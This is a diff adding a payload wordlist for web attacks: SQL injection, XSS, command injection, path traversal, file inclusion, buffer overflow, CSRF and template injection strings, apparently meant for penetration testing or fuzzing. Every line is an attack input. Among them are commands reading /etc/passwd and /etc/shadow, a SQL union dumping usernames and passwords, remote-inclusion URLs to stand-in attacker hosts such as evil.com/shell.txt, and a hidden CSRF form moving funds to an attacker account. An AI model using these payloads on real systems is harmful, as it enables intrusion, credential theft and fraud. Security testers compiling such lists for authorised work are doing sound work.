@@ -1,0 +1,95 @@
+# SQL Injection Payloads
+' OR 1=1; --
+' OR '1'='1'; --
+' OR 'x'='x'; --
+' OR 1=1#
+" OR 1=1#
+' OR 1=1 LIMIT 1; --
+' UNION SELECT 1,2,3--
+" UNION SELECT 1,2,3--
+" OR ""="
+' UNION SELECT NULL,NULL,NULL--
+' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--
+' AND 1=0 UNION ALL SELECT 1,username,password FROM users--
+
+# XSS Payloads
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<IMG SRC="javascript:alert('XSS')">
+"><IMG SRC="javascript:alert('XSS')">
+<svg onload=alert('XSS')>
+<iframe src="javascript:alert('XSS');"></iframe>
+"><svg/onload=alert('XSS')>
+<marquee><img src=x onerror=alert('XSS')></marquee>
+"><img src=x onerror=alert('XSS')>
+
+# Command Injection Payloads
+; ls -la
+; cat /etc/passwd
+`ls`
+| whoami
+$(id)
+&& ls
+&& cat /etc/shadow
+|| ls -la
+| id
+
+# Path Traversal Payloads
+../../../../../../etc/passwd
+../etc/passwd
+../../../../windows/system32/cmd.exe
+../../../../../../../../../../etc/passwd
+../../../boot.ini
+../../../../../../etc/shadow
+../../../../../etc/hosts
+../../../../../etc/apache2/sites-available/000-default.conf
+
+# Buffer Overflow Payloads
+A*5000
+B*5000
+C*10000
+%u9090%u9090%u9090%uFFFF
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+$(perl -e 'print "A" x 10000')
+
+# Local File Inclusion Payloads
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/shadow
+../../../../../../../../../../etc/hosts
+../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../boot.ini
+../WEB-INF/web.xml
+../META-INF/maven/pom.xml
+../../../windows/win.ini
+
+# Remote File Inclusion Payloads
+http://evil.com/shell.txt
+http://malicious-site.com/malicious.php
+http://attacker.com/file.php
+http://example.com/shell.php
+http://malicioussite.com/exploit.php
+https://evil.com/malicious.txt
+https://attacker.com/evil.sh
+
+# CSRF Exploit Payloads
+<form method="POST" action="http://example.com/vulnerable">
+    <input type="hidden" name="amount" value="1000000">
+    <input type="hidden" name="recipient" value="attacker-account">
+</form>
+
+# Directory Traversal Payloads
+../../../../etc/passwd
+../../../../../windows/system32/drivers/etc/hosts
+../../../../etc/hosts
+../../../../etc/ssh/sshd_config
+../../../../etc/hostname
+../../../../proc/self/environ
+../../../../etc/httpd/conf/httpd.conf
+../../../var/log/messages
+
+# SSTI (Server-Side Template Injection) Payloads
+{{7*7}}
+${{7*7}}
+{{ self.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{% for c in " ".__class__.__base__.__subclasses__() %}{% if c.__name__ == "catch_warnings" %}{{ c.__code__.co_filename }}{% endif %}{% endfor %}
